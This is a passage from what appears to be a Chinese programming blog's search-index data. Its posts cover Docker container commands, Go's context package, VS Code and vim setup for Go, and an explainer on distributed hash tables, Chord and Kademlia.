do echo hello world; sleep 1; done\"\n77b2dc01fe0f3f1265df143181e7b9af5e05279a884f4776ee75350ea9d8017a\n```\n\n此时容器会在后台运行并不会把输出的结果 (STDOUT) 打印到宿主机上面(输出结果可以用 `docker logs`查看)。\n\n\n\n要获取容器的输出信息，可以通过 `docker container logs` 命令。\n\n```\ndocker container logs [container ID or NAMES]\nhello world\nhello world\nhello world\n. . .\n```\n\n\n\n### 4.4 终止容器\n\n可以使用 `docker container stop` 来终止一个运行中的容器。\n\n \n\n### 4.5 进入容器\n\n`docker exec` 后边可以跟多个参数，这里主要说明 `-i` `-t` 参数。\n\n只用 `-i` 参数时，由于没有分配伪终端，界面没有我们熟悉的 Linux 命令提示符，但命令执行结果仍然可以返回。\n\n当 `-i` `-t` 参数一起使用时，则可以看到我们熟悉的 Linux 命令提示符。\n\n\n\n```\ndocker exec -it 69d1 bash\nroot@69d137adef7a:/#\n```\n\n\n\n### 4.6 导出容器\n\n如果要导出本地某个容器，可以使用 `docker export` 命令。\n\n```\ndocker export 7691a814370e > ubuntu.tar\n```\n\n这样将导出容器快照到本地文件。\n\n\n\n### 4.7 导入容器快照\n\n```\n$ cat ubuntu.tar | docker import - test/ubuntu:v1.0\n$ docker image ls\nREPOSITORY          TAG                 IMAGE ID            CREATED              VIRTUAL SIZE\ntest/ubuntu         v1.0                9d37a6082e97        About a minute ago   171.3 MB\n```\n\n\n\n此外，也可以通过指定 URL 或者某个目录来导入，例如\n\n```\n$ docker import http://example.com/exampleimage.tgz example/imagerepo\n```\n\n\n\n注：用户既可以使用 docker load 来导入镜像存储文件到本地镜像库，也可以使用 docker import 来导入一个容器快照到本地镜像库。这两者的区别在于容器快照文件将丢弃所有的历史记录和元数据信息（即仅保存容器当时的快照状态），而镜像存储文件将保存完整记录，体积也要大。此外，从容器快照文件导入时可以重新指定标签等元数据信息。 \n\n\n\n### 4.8 删除容器\n\n可以使用 `docker container rm` 来删除一个处于终止状态的容器。例如\n\n```\n$ docker container rm  trusting_newton\ntrusting_newton\n```\n\n\n\n### 4.9 清理所有处于终止状态的容器\n\n```\n$ docker container prune\n```\n\n\n\n# 5. 访问仓库\n\n### 5.1 Docker Hub\n\n你可以在 [https://cloud.docker.com](https://cloud.docker.com/) 免费注册一个 Docker 账号。\n\n可以通过执行 `docker login` 命令交互式的输入用户名及密码来完成在命令行界面登录 Docker Hub。\n\n你可以通过 `docker logout` 退出登录。\n\n\n\n### 5.2 拉取镜像\n\n你可以通过 `docker search` 命令来查找官方仓库中的镜像，并利用 `docker pull` 命令来将它下载到本地。\n\n\n\n一种是类似 `centos` 这样的镜像，被称为基础镜像或根镜像。这些基础镜像由 Docker 公司创建、验证、支持、提供。这样的镜像往往使用单个单词作为名字。\n\n还有一种类型，比如 `tianon/centos` 镜像，它是由 Docker 的用户创建并维护的，往往带有用户名称前缀。可以通过前缀 `username/` 来指定使用某个用户提供的镜像，比如 tianon 用户。\n\n\n\n### 5.3 推送镜像\n\n用户也可以在登录后通过 `docker push` 命令来将自己的镜像推送到 Docker Hub。\n\n```\n$ docker tag ubuntu:17.10 username/ubuntu:17.10\n\n$ docker image ls\n\nREPOSITORY                                               TAG                    IMAGE ID            CREATED             SIZE\nubuntu                                                   17.10                  275d79972a86        6 days ago          94.6MB\nusername/ubuntu                                          17.10                  275d79972a86        6 days ago          94.6MB\n\n$ docker push username/ubuntu:17.10\n\n$ docker search username\n\nNAME                      DESCRIPTION                                     STARS               OFFICIAL            AUTOMATED\nusername/ubuntu\n```\n\n\n\n### 5.4 自动创建\n\n有时候，用户创建了镜像，安装了某个软件，如果软件发布新版本则需要手动更新镜像。\n\n而自动创建允许用户通过 Docker Hub 指定跟踪一个目标网站（目前支持 [GitHub](https://github.com/) 或 [BitBucket](https://bitbucket.org/)）上的项目，一旦项目发生新的提交或者创建新的标签（tag），Docker Hub 会自动构建镜像并推送到 Docker Hub 中。\n\n \n\n要配置自动创建，包括如下的步骤：\n\n- 创建并登录 Docker Hub，以及目标网站；\n- 在目标网站中连接帐户到 Docker Hub；\n- 在 Docker Hub 中 [配置一个自动创建](https://registry.hub.docker.com/builds/add/)；\n- 选取一个目标网站中的项目（需要含 `Dockerfile`）和分支；\n- 指定 `Dockerfile` 的位置，并提交创建。\n\n之后，可以在 Docker Hub 的 [自动创建页面](https://registry.hub.docker.com/builds/) 中跟踪每次创建的状态。\n\n\n\n### 5.5 私有仓库\n\n[`docker-registry`](https://docs.docker.com/registry/) 是官方提供的工具，可以用于构建私有的镜像仓库。\n\n\n\n# 6. 参考资料\n\n+ docker基础入门教程（二）https://www.liuvv.com/p/cc94e38a.html","tags":["docker"],"categories":["docker"]},{"title":"golang的context包使用场景","url":"%2Fp%2F63c8f369.html","content":"\n\n# 1. 介绍\n一个网络请求Request，每个Request都需要开启一个goroutine做一些事情，这些goroutine又可能会开启其他的goroutine。所以我们需要一种可以跟踪goroutine的方案，才可以达到控制他们的目的，这就是Go语言为我们提供的Context，称之为上下文非常贴切，它就是goroutine的上下文。\n\n<!-- more -->\n\n### 1.1 Context 接口\n\n```go\ntype Context interface {\n\tDeadline() (deadline time.Time, ok bool)\n\tDone() <-chan struct{}\n\tErr() error\n\tValue(key interface{}) interface{}\n}\n```\n\n\n* Deadline方法是获取设置的截止时间的意思，第一个返回式是截止时间，到了这个时间点，Context会自动发起取消请求；第二个返回值ok==false时表示没有设置截止时间，如果需要取消的话，需要调用取消函数进行取消。\n\n* Done方法返回一个只读的chan，类型为struct{}，我们在goroutine中，如果该方法返回的chan可以读取，则意味着parent context已经发起了取消请求，我们通过Done方法收到这个信号后，就应该做清理操作，然后退出goroutine，释放资源。\n\n* Err方法返回取消的错误原因，因为什么Context被取消。\n\n* Value方法获取该Context上绑定的值，是一个键值对，所以要通过一个Key才可以获取对应的值，这个值一般是线程安全的。\n\n### 1.2 Context的继承衍生\n\n```go\nfunc WithCancel(parent Context) (ctx Context, cancel CancelFunc)\nfunc WithDeadline(parent Context, deadline time.Time) (Context, CancelFunc)\nfunc WithTimeout(parent Context, timeout time.Duration) (Context, CancelFunc)\nfunc WithValue(parent Context, key, val interface{}) Context\n```\n\n# 2. 使用\n\n### 2.1 value传递数据\n\n```go\npackage main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"time\"\n)\n\nvar key string = \"name\"\n\nfunc main() {\n\tctx, cancel := context.WithCancel(context.Background())\n\tvalueCtx := context.WithValue(ctx, key, \"监控1\")\n\tgo watch(valueCtx)\n\n\ttime.Sleep(10 * time.Second)\n\tfmt.Println(\"可以了，通知监控停止\")\n\n\tcancel()\n\ttime.Sleep(5 * time.Second)\n}\nfunc watch(ctx context.Context) {\n\tfor {\n\t\tselect {\n\t\tcase <-ctx.Done():\n\t\t\tfmt.Println(ctx.Value(key), \"监控退出，停止了...\")\n\t\t\treturn\n\t\tdefault:\n\t\t\tfmt.Println(ctx.Value(key), \"goroutine监控中...\")\n\t\t\ttime.Sleep(2 * time.Second)\n\t\t}\n\t}\n}\n\n\n监控1 goroutine监控中...\n监控1 goroutine监控中...\n监控1 goroutine监控中...\n监控1 goroutine监控中...\n监控1 goroutine监控中...\n可以了，通知监控停止\n监控1 监控退出，停止了...\n```\n\n### 2.2 控制gorotuine退出\n\n```go\npackage main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\tctx, cancel := context.WithCancel(context.Background())\n\tgo watch(ctx, \"监控1\")\n\tgo watch(ctx, \"监控2\")\n\tgo watch(ctx, \"监控3\")\n\ttime.Sleep(10 * time.Second)\n\tfmt.Println(\"可以了，通知监控停止\")\n\tcancel()\n\n\ttime.Sleep(5 * time.Second)\n}\nfunc watch(ctx context.Context, name string) {\n\tfor {\n\t\tselect {\n\t\tcase <-ctx.Done():\n\t\t\tfmt.Println(name, \"监控退出，停止了...\")\n\t\t\treturn\n\t\tdefault:\n\t\t\tfmt.Println(name, \"goroutine监控中...\")\n\t\t\ttime.Sleep(2 * time.Second)\n\t\t}\n\t}\n}\n\n\n监控3 goroutine监控中...\n监控2 goroutine监控中...\n监控1 goroutine监控中...\n监控3 goroutine监控中...\n监控2 goroutine监控中...\n监控1 goroutine监控中...\n监控3 goroutine监控中...\n监控2 goroutine监控中...\n监控1 goroutine监控中...\n监控1 goroutine监控中...\n监控2 goroutine监控中...\n监控3 goroutine监控中...\n监控1 goroutine监控中...\n监控2 goroutine监控中...\n监控3 goroutine监控中...\n可以了，通知监控停止\n监控3 监控退出，停止了...\n监控1 监控退出，停止了...\n监控2 监控退出，停止了...\n\n```\n\n\n示例中启动了3个监控goroutine进行不断的监控，每一个都使用了Context进行跟踪，当我们使用cancel函数通知取消时，这3个goroutine都会被结束。这就是Context的控制能力，它就像一个控制器一样，按下开关后，所有基于这个Context或者衍生的子Context都会收到通知，这时就可以进行清理操作了，最终释放goroutine，这就优雅的解决了goroutine启动后不可控的问题。\n\n### 2.3 总结\n\n\n* 不要把Context放在结构体中，要以参数的方式传递\n* 以Context作为参数的函数方法，应该把Context作为第一个参数，放在第一位。\n* 给一个函数方法传递Context的时候，不要传递nil，如果不知道传递什么，就使用context.TODO\n* Context的Value相关方法应该传递必须的数据，不要什么数据都使用这个传递\n* Context是线程安全的，可以放心的在多个goroutine中传递\n\n","tags":["golang"],"categories":["4_golang实战"]},{"title":"golang_ide_vscode的使用调试和问题解决","url":"%2Fp%2F127812f2.html","content":"\n\n\n### 安装 vscode后的plugins:\n\n1. go\n2. vscode-icons\n3. code runner\n4. markdown preview github\n5. markdown auto-open\n6. vscode snippets 模板文件: [https://github.com/Microsoft/vscode-go/blob/master/snippets/go.json](https://github.com/Microsoft/vscode-go/blob/master/snippets/go.json)\n7. theme molokai 自带\n  \n\n<!-- more -->\n### vscode增加golang debug调试:\n\n1. xcode-select --install\n\n2. 钥匙链创建证书 dlv-cert\n  \n3. 证书签名\n\n```    \ncd $GOPATH/src/github.com/derekparker\n    \ngit clone https://github.com/derekparker/delve.git  //调试 golang\n    \ncd delve\n    \nCERT=dlv-cert make install\n```\n\n\n\n\n\n### 我的vscode配置文件\n\n> setting.json\n\n```\n{\n    \"files.associations\": {\n        \"*.lua.txt\": \"lua\"\n    },\n    \"files.exclude\": {\n        \"**/.git\": true,\n        \"**/.svn\": true,\n        \"**/.hg\": true,\n        \"**/CVS\": true,\n        \"**/.DS_Store\": true,\n        \"**/*.meta\": true,\n    },\n    \"files.autoSave\": \"afterDelay\",\n    \"workbench.colorTheme\": \"Monokai\",\n    \"workbench.iconTheme\": \"vscode-icons\",\n    \"workbench.editor.enablePreview\": false,\n    \"editor.fontSize\": 14,\n    \"editor.minimap.enabled\": false,\n    \"editor.formatOnType\": true,\n    \"editor.formatOnSave\": true,\n    \"extensions.autoUpdate\": false,\n    \"extensions.ignoreRecommendations\": true,\n    \"window.zoomLevel\": 0,\n    \"luaide.scriptRoots\": [\n        \"/Users/liuwei/workspace/client3-5/Assets/Resources/Lua\"\n    ],\n    \"vim.disableAnnoyingNeovimMessage\": true,\n    \"go.useLanguageServer\": true,\n    \"go.docsTool\": \"gogetdoc\",\n    \"go.buildOnSave\": true,\n    \"go.lintOnSave\": true,\n    \"go.vetOnSave\": true,\n    \"go.buildFlags\": [],\n    \"go.lintFlags\": [],\n    \"go.vetFlags\": [],\n    \"go.coverOnSave\": false,\n    \"go.useCodeSnippetsOnFunctionSuggest\": false,\n    \"go.formatOnSave\": true,\n    \"go.formatTool\": \"goreturns\",\n    \"go.goroot\": \"/usr/local/Cellar/go/1.9.2/libexec\",\n    \"go.gopath\": \"/Users/liuwei/golang\",\n}\n\n```\n\n> launch.json\n\n```\n{\n    // 使用 IntelliSense 了解相关属性。 \n    // 悬停以查看现有属性的描述。\n    // 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387\n    \"version\": \"0.2.0\",\n    \"configurations\": [\n        {\n            \"name\": \"Launch\",\n            \"type\": \"go\",\n            \"request\": \"launch\",\n            \"mode\": \"debug\",\n            \"remotePath\": \"\",\n            \"port\": 2345,\n            \"host\": \"127.0.0.1\",\n            \"program\": \"${fileDirname}\",\n            \"env\": {},\n            \"args\": [],\n            \"showLog\": true\n        }\n    ]\n}\n```\n\n\n\n\n\n\n### vscode 遇到的问题\n\n+ flag provided but not defined: -goversion\n\n一个是版本原因, 一个是vscode也要修改配置gopath, 坑爹\n\n>Thank you, I was able to solve this by running brew uninstall --force go and then downloading the latest installer. Anyone who reads this and wants to use brew you could probably just do brew install go after the forced uninstall. I had to restart my terminal and Gogland after doing this.\n\n+ vscode not jump define\n\n```\n\"go.useLanguageServer\": true,\n\"go.docsTool\": \"gogetdoc\",\n```\n\n+ vscode could not launch process: exec: \"lldb-server\": executable file not found in $PATH\n\n```\nxcode-select --install\n```\n\n\n+ vscode jump slow\n\n安装https://github.com/sourcegraph/go-langserver 源码安装 需要 go install\n\n```\n\"go.useLanguageServer\": true,\n```\n\n\n+ vscode output window hide go\n\n~/.vscode/扩展包/package.json 找到显示的\n\n```\n\"showOutput\": \"never\"\n```\n\n","tags":["golang"],"categories":["3_golang杂项"]},{"title":"vim插件管理_vimrc配置","url":"%2Fp%2F1b9bff9b.html","content":"\n# 1. vim-plug 安装\n\n```bash\ncurl -fLo ~/.vim/autoload/plug.vim --create-dirs \\\n    https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim\n\n# 进入vim,  :PlugInstall 执行安装命令\n```\n\n<!-- more -->\n\n# 2. 我的.vimrc\n\n```bash\n\" Plugin \ncall plug#begin()\nPlug 'tomasr/molokai' \"主题\nPlug 'ctrlpvim/ctrlp.vim' \"快速查文件\nPlug 'Shougo/neocomplete.vim' \"代码实时提示\nPlug 'majutsushi/tagbar' \"tagbar\nPlug 'scrooloose/nerdtree' \"导航树\nPlug 'jistr/vim-nerdtree-tabs' \"导航树插件\nPlug 'vim-airline/vim-airline' \"状态栏\nPlug 'ervandew/supertab' \"supertab\nPlug 'SirVer/ultisnips' \"代码模板\nPlug 'Valloric/YouCompleteMe' \"table补全\nPlug 'easymotion/vim-easymotion' \"极速跳转\ncall plug#end()\n\n\n\" mapping\nlet mapleader=\",\"\nset mouse=a \"可以用鼠标拖动\nset clipboard=unnamed \"鼠标选中y复制\n\n\n\" easymotion\nlet g:EasyMotion_smartcase = 1\nlet g:EasyMotion_startofline = 0 \" keep cursor column when JK motion\nnmap s <Plug>(easymotion-overwin-f)\nnmap s <Plug>(easymotion-overwin-f2)\nmap  / <Plug>(easymotion-sn)\nomap / <Plug>(easymotion-tn)\nmap  n <Plug>(easymotion-next)\nmap  N <Plug>(easymotion-prev)\nmap <Leader>j <Plug>(easymotion-j)\nmap <Leader>k <Plug>(easymotion-k)\nmap <Leader>w <Plug>(easymotion-w)\nmap <Leader>b <Plug>(easymotion-b)\n\n\n\n\" Color \nsyntax enable\nset t_Co=256\nlet g:rehash256 = 1\nlet g:molokai_original = 1\ncolorscheme molokai\n\n\" Ycm\n\"let g:ycm_server_use_vim_stdout = 1\n\"let g:ycm_server_log_level = 'debug'\n\" make YCM compatible with UltiSnips (using supertab)\nlet g:ycm_key_list_select_completion = ['<C-n>', '<Down>']\nlet g:ycm_key_list_previous_completion = ['<C-p>', '<Up>']\nlet g:SuperTabDefaultCompletionType = '<C-n>'\nlet g:UltiSnipsExpandTrigger = \"<tab>\"\nlet g:UltiSnipsJumpForwardTrigger = \"<tab>\"\nlet g:UltiSnipsJumpBackwardTrigger = \"<s-tab>\"\n\n\n\" Nerdtree\n\"autocmd vimenter * NERDTree \"自动打开Tree\n\"autocmd vimenter * Tagbar \"自动打开TagBar\nnmap <F7> :NERDTreeToggle<CR>\nnmap <F8> :TagbarToggle<CR>\nlet NERDTreeWinSize=20 \"设置nerdtree宽度\nlet g:tagbar_width=20 \"设置宽度，默认为40\n\"let g:nerdtree_tabs_open_on_console_startup=1 \"启动打开nerdtree\nlet g:neocomplete#enable_at_startup = 1 \"代码实时提示\n\"let NERDTreeQuitOnOpen=1 \"打开文件后自动关闭窗口\n\n\" 打开NERDTree,定位到当前文件\nnoremap <silent> <Leader>f :NERDTreeFind<cr> \n\"打开tagbar窗口,跳转后自动关闭,q不跳转直接关闭\nnoremap <silent> <Leader>g :TagbarOpen fjc<cr> \n\" NERDTree tab switch\nmap  <C-l> :tabn<CR>\nmap  <C-h> :tabp<CR>\nmap  <C-o> :tabnew<CR>\n\n\n\" config\nset tabstop=4                   \" 设定tab长度为4\nset shiftwidth=4                \" 缩进的空格数为4\n\nfiletype off                    \" Reset filetype detection first ...\nfiletype plugin indent on       \" ... and enable filetype detection\nset nocompatible                \" Enables us Vim specific features\nset ttyfast                     \" Indicate fast terminal conn for faster \nset ttymouse=xterm2             \" Indicate terminal type for mouse codes\nset ttyscroll=3                 \" Speedup scrolling\nset laststatus=2                \" Show status line always\nset encoding=utf-8              \" Set default encoding to UTF-8\nset autoread                    \" Automatically read changed files\nset autoindent                  \" Enabile Autoindent\nset backspace=indent,eol,start  \" Makes backspace key more powerful.\nset incsearch                   \" Shows the match while typing\nset hlsearch                    \" Highlight found searches\nset noerrorbells                \" No beeps\nset number                      \" Show line numbers\nset showcmd                     \" Show me what I'm typing\nset noswapfile                  \" Don't use swapfile\nset nobackup                    \" Don't create annoying backup files\nset splitright                  \" Vertical windows should be split to right\nset splitbelow                  \" Horizontal windows should split to bottom\nset autowrite                   \" Automatically save before :next, :make etc.\nset hidden                      \" Buffer still exist if window is closed\nset fileformats=unix,dos,mac    \" Prefer Unix over Windows over OS 9 formats\nset noshowmatch                 \" Do not show matching brackets by flickering\nset noshowmode                  \" We show the mode with airline or lightline\nset ignorecase                  \" Search case insensitive...\nset smartcase                   \" but not it begins with upper case\nset completeopt=menu,menuone    \" Show popup menu, even if there is one entry\nset pumheight=10                \" Completion window max size\nset nocursorcolumn              \" Dont highlight column\nset nocursorline                \" Dont highlight cursor\nset lazyredraw                  \" Wait to redraw\nset cursorcolumn\n```\n\n\n\n# 3. vim配置\n\n### 3.1 vim 拷贝到系统剪贴板\n\n1. which vim可以看到当前使用的vim是哪个，vim --version可以看到当前使用的vim支持哪些feature，'+'前缀表示拥有的feature，'-'前缀表示未拥有；\n\n2. '+clipboard'是支持使用系统剪切板的feature；如果你当前使用的vim不支持clipboard，那需要brew upgrade vim装一个新的；\n\n3. 安装新的以后，要把这个新的vim设置为默认vim，通常使用alias设置一下别名，或者通过环境变量设置，或者删掉旧的，做个软连接；\n\n4. 确认+clipboard以后，在.vimrc文件中加入set clipboard=unamed，就可以在vim中使用系统剪切板了\n\n\n","tags":["vim"],"categories":["vim"]},{"title":"dht分布式散列表和kad介绍","url":"%2Fp%2F2c46e603.html","content":"\n\n### 1. 如何实现散列表\n\n+ 在散列表这种数据结构中，会包含 N 个 bucket（桶）。对于某个具体的散列表，N（桶的数量）通常是【固定不变】的。于是可以对每个桶进行编号，从 0 到 N-1。\n\n+ “桶”是用来存储“键值对”的，你可以把它通俗理解成一个动态数组，里面可以存放【多个】“键值对”。\n\n+ 当使用某个 key 进行查找，会先用某个散列函数计算这个 key 的散列值。得到散列值通常是一个整数，然后用散列值对 N（桶数）进行“取模”运算（除法求余数），就可以算出对应的桶编号。（注：取模运算是最常用的做法，但不是唯一的做法）\n\n<!-- more -->\n\n### 2. 分布式散列表 DHT\n\n##### 2.1 P2P 技术路线\n\n- 中央服务器  Napster  ->单点故障\n- 广播   Gnutella 早期版本 ->广播风暴\n- DHT\n\n##### 2.2 DHT 难点\n\n- 无中心 \n\t\n\t需要提供一系列机制来实现节点之间的通讯。\n- 海量数据 \n\t\n\t每个节点只能存储（整个系统的）一小部分数据。需要把数据【均匀分摊】到每个节点。\n- 节点动态变化  \n\n\t统散列表所含的【桶数】是固定不变滴。为啥捏？因为传统散列表在针对 key 计算出散列值之后，需要用“散列值”和“桶数”进行某种运算（比如：取模运算），从而得到桶的编号。如果桶的数量出现变化，就会影响到上述“取模运算”的结果，然后导致数据错乱。\n\n- 高效查询\n\n##### 2.3 DHT 难点解决\n\n- 散列算法的选择\n\n\tDHT业务数据的散列值作为Key,业务数据为Value, 所以要避免碰撞\n\n- 同构的 nodeID 和 data key\n\n\tDHT 属于分布式系统的一种。既然是分布式系统，意味着存在【多个】节点\n\t\n\t很多 DHT 的设计会让“node ID”采用跟“data key”【同构】的散列值。这么搞的好处是\n\t1、当散列值空间足够大的时候，随机碰撞忽略不计，因此也就确保了 node ID 的唯一性 2、可以简化系统设计——比如简化路由算法\n\t\n- “拓扑结构”的设计\n\n\t作为分布式系统，DHT 必然要定义某种拓扑结构；有了拓扑结构，自然就要设计某种“路由算法”。如果某个 DHT 采用前面所说的——“node ID”与“data key”【同构】——那么很自然的就会引入“Key-based routing”。\n\t\n\t请注意，这【不是】某个具体的路由算法，而只是某种【风格】。采用这种风格来设计路由机制，好处是：key 本身已经提供了足够多的路由信息。\n\n- “路由算法”的权衡\n\n  由于 DHT 中的节点数可能非常多（比如：几十万、几百万），而且这些节点是动态变化的。因此就【不可能】让每一个节点都记录所有其它节点的信息。实际情况是：每个节点通常只知道少数一些节点的信息。\n\n  在确定了路由算法之后，还需要做一个两难的权衡——“路由表的大小”。\n  路由表越大，可以实现越短（跳数越少）的路由；缺点是：（由于节点动态变化）路由表的维护成本也就越高。\n  路由表数越小，其维护成本越小；缺点是：路由就会变长（跳数变多）。\n\n- 距离算法\n\n   某些 DHT 系统还会定义一种“距离算法”，用来计算：“节点之间的距离”、“数据之间的距离”、“节点与数据的距离”。\n\n   写到这里，某些聪明的读者就会明白：为啥前面要强调——“node ID”与“data key”【同构】。当这两者【同构】，就可以使用【同一种“距离算法”】；反之，如果这两者不同构，多半要引入几种不同的“距离算法”。\n\n- 数据定位\n\n\t+ 保存数据\n\t\t\n\t\t当某个节点得到了新加入的数据（K/V），它会先计算自己与新数据的 key 之间的“距离”；然后再计算它所知道的其它节点与这个 key 的距离。\n\t\t\n\t\t如果计算下来，自己与 key 的距离最小，那么这个数据就保持在自己这里。否则的话，把这个数据转发给距离最小的节点。收到数据的另一个节点，也采用上述过程进行处理（递归处理）。\n\n\t+ 获取数据\n\n\t   当某个节点接收到查询数据的请求（key），它会先计算自己与 key 之间的“距离”；然后再计算它所知道的其它节点与这个 key 的距离。\n\t\n\t  如果计算下来，自己与 key 的距离最小，那么就在自己这里找有没有 key 对应的 value。有的话就返回 value，没有的话就报错。否则的话，把这个数据转发给距离最小的节点。收到数据的另一个节点，也采用上述过程进行处理（递归处理）。\n\n### 3. Chord 协议\n\n+ 概述\n\nChord 诞生于2001年。第一批 DHT 协议都是在那年涌现的，另外几个是：CAN、Tapestry、Pastry。\n\n\n+ 拓扑结构——环形\n\t\n\t当初设计“一致散列”主要是为了解决“节点动态变化”这个难点（前面有提及）。为了解决这个难点，“一致散列”把散列值空间（keyspace）构成一个【环】。对于 m 比特的散列值，其范围是 [0, 2m-1]。你把这个区间头尾相接就变成一个环，其周长是 2m。然后对这个环规定了一个移动方向（比如顺时针）。\n\t\n\t\n\t假设有某个节点A，距离它最近的是节点B（以顺时针方向衡量距离）。那么称 B 是 A 的【继任】（successor），A 是 B 的【前任】（predecessor）。\n\n\t```\n\t数据隶属于【距离最小】的节点。以 m=6 的环形空间为例：\n\t数据区间 [5,8] 隶属于节点8\n\t数据区间 [9,15] 隶属于节点15\n\t......\n\t数据区间 [59,4] 隶属于节点4（注：“6比特”的环形空间，63之后是0）\n\t```\n\n\n+ 路由机制\n\n\t- 基本路由（简单遍历）\n\n\t\t当收到请求（key），先看 key 是否在自己这里。如果在自己这里，就直接返回信息；否则就把 key 转发给自己的继任者。以此类推。\n\t　　这种玩法的时间复杂度是 O(N)。对于一个节点数很多的 DHT 网络，这种做法显然非常低效。\n\t\n\t- 高级路由（Finger Table）\n\n\t\t“Finger Table”是一个列表，最多包含 m 项（m 就是散列值的比特数），每一项都是节点 ID。 每一个节点都有个路由表\n\t\t\n\t\t\n\t\t假设当前节点的 ID 是 n，那么表中第 i 项的值是：successor( (n + 2i) mod 2m ) 当收到请求（key），就到“Finger Table”中找到【最大的且不超过 key】的那一项，然后把 key 转发给这一项对应的节点。有了“Finger Table”之后，时间复杂度可以优化为 O(log N)。`跳跃式查询`\n\t\t\n\n+ 节点的加入\n\n\t- 任何一个新来的节点（假设叫 A），需要先跟 DHT 中已有的任一节点（假设叫 B）建立连接。\n\t- A 随机生成一个散列值作为自己的 ID（对于足够大的散列值空间，ID 相同的概率忽略不计）\n\t- A 通过跟 B 进行查询，找到自己这个 ID 在环上的接头人。也就是——找到自己这个 ID 对应的“继任”（假设叫 C）与“前任”（假设叫 D）\n\t- 　接下来，A 需要跟 C 和 D 进行一系列互动，使得自己成为 C 的前任，以及 D 的继任。这个互动过程，大致类似于在双向链表当中插入元素\n\n+ 节点的【正常】退出\n\n\t- 如果某个节点想要主动离开这个 DHT 网络，按照约定需要作一些善后的处理工作。比如说，通知自己的前任去更新其继任者......\n　　这些善后处理，大致类似于在双向链表中删除元素\n\n+ 节点的【异常】退出\n\n\t- 作为一个分布式系统，任何节点都有可能意外下线（也就是说，来不及进行善后就挂掉了）\n\n\t\t假设 节点A 的继任者【异常】下线了，那么 节点A 就抓瞎了。咋办捏？为了保险起见，Chord 引入了一个“继任者候选列表”的概念。每个节点都用这个列表来包含：距离自己最近的 N 个节点的信息，顺序是【由近到远】。一旦自己的继任者下线了，就在列表中找到一个【距离最近且在线】的节点，作为新的继任者。然后 节点A 更新该列表，确保依然有 N 个候选。更新完“继任者候选列表”后，节点A 也会通知自己的前任，那么 A 的前任也就能更新自己的“继任者候选列表”。\n\t\t\n\t\t\n### 4. Kademlia（Kad）协议\n\n\n+ 拓扑结构——二叉树\n\n\t- 散列值的预处理\n\n\t\tKad 也采用了“node ID 与 data key 同构”的设计思路。然后 Kad 采用某种算法把 key 映射到一个二叉树，每一个 key 都是这个二叉树的【叶子】。在映射之前，先做一下预处理。\n\t\t1. 先把 key 以二进制形式表示。\n\t\t2. 把每一个 key 缩短为它的【最短唯一前缀】。\n\n\t\n\t- 散列值的映射\n\n\t\t完成上述的预处理后，接下来的映射规则是：\n\t\n\t\t1. 先把 key 以二进制形式表示，然后从高位到低位依次处理。\n\t\t2. 二进制的第 n 个数位就对应了二叉树的第 n 层\n\t\t3. 如果该位是1，进入左子树，是0则进入右子树（这只是人为约定，反过来处理也可以）\n\t\t4. 全部数位都处理完后，这个 key 就对应了二叉树上的某个【叶子】\n\n+ 距离算法——异或（XOR）\n\n\t接下来要聊的是 Kad 最精妙之处——采用 XOR（按比特异或操作）算法计算 key 之间的“距离”。这种搞法使得它具备了类似于“几何距离”的某些特性（下面用 ⊕ 表示 XOR）\n\t\n\t```\n\t(A ⊕ B) == (B ⊕ A)\tXOR 符合“交换律”，具备对称性。相比之下，Chord 的距离算法不对称\n\t(A ⊕ A) == 0\t反身性，自身距离为零\n\t(A ⊕ B) > 0\t【不同】的两个 key 之间的距离必大于零\n\t(A ⊕ B) + (B ⊕ C) >= (A ⊕ C)\t三角不等式\n\t```\n\t\n+ 路由机制\n\n\t+ 二叉树的拆分\n\n\t对每一个节点，都可以【按照自己的视角】对整个二叉树进行拆分。\n\t\n\t拆分的规则是：先从根节点开始，把【不包含】自己的那个子树拆分出来；然后在剩下的子树再拆分不包含自己的下一层子树；以此类推，直到最后只剩下自己。\n\t\n\tKad 默认的散列值空间是 m=160（散列值有 160 比特），因此拆分出来的子树【最多】有 160 个（考虑到实际的节点数【远远小于】2160，子树的个数会明显小于 160）。\n\t\n\t对于每一个节点而言，当它以自己的视角完成子树拆分后，会得到 n 个子树；对于每个子树，如果它都能知道里面的一个节点，那么它就可以利用这 n 个节点进行递归路由，从而到达整个二叉树的【任何一个】节点\n\t\n+ K-桶（K-bucket） \n\n\t每个节点在完成子树拆分后，只需要知道每个子树里面的一个节点，就足以实现全遍历。但是考虑到健壮性（请始终牢记：分布式系统的节点是动态变化滴），光知道【一个】显然是不够滴，需要知道【多个】才比较保险。\n\t\n\t所以 Kad 论文中给出了一个“K-桶（K-bucket）”的概念。也就是说：每个节点在完成子树拆分后，要记录每个子树里面的 K 个节点。这里所说的 K 值是一个【系统级】的常量。由使用 Kad 的软件系统自己设定（比如 BT 下载使用的 Kad 网络，K 设定为 8）。\n\t\n\tK 桶其实就是【路由表】。对于某个节点而言，如果【以它自己为视角】拆分了 n 个子树，那么它就需要维护 n 个路由表，并且每个路由表的【上限】是 K。说 K 只是一个【上限】，是因为有两种情况使得 K 桶的尺寸会小于 K。\n\t1. 距离越近的子树就越小。如果整个子树【可能存在的】节点数小于 K，那么该子树的 K 桶尺寸永远也不可能达到 K。\n\t2. 有些子树虽然实际上线的节点数超过 K，但是因为种种原因，没有收集到该子树足够多的节点，这也会使得该子树的 K 桶尺寸小于 K。\n\t\n+ K-桶（K-bucket）的刷新机制\n\n\t+ `主动收集节点`　\t\t　\n\t\t\n\t\t任何节点都可以主动发起“查询节点”的请求（对应于协议类型 FIND_NODE），从而刷新 K 桶中的节点信息\n\t\t\n\t+ `被动收集节点`\n\n\t\t如果收到其它节点发来的请求（协议类型 FIND_NODE 或 FIND_VALUE），会把对方的 ID 加入自己的某个 K 桶中。 \n\t\t\n\t+ `探测失效节点`\n\t\n\t\tKad 还是支持一种探测机制（协议类型 PING），可以判断某个 ID 的节点是否在线。因此就可以定期探测路由表中的每一个节点，然后把下线的节点从路由表中干掉。\n\n\n+ “并发请求”与“α 参数”\n\n\t“K桶”的这个设计思路【天生支持并发】。因为【同一个】“K桶”中的每个节点都是平等的，没有哪个更特殊；而且对【同一个】“K桶”中的节点发起请求，互相之间没有影响（无耦合）。\n\t\n\t所以 Kad 协议还引入了一个“α 参数”，默认设置为 3，使用 Kad 的软件可以在具体使用场景中调整这个 α 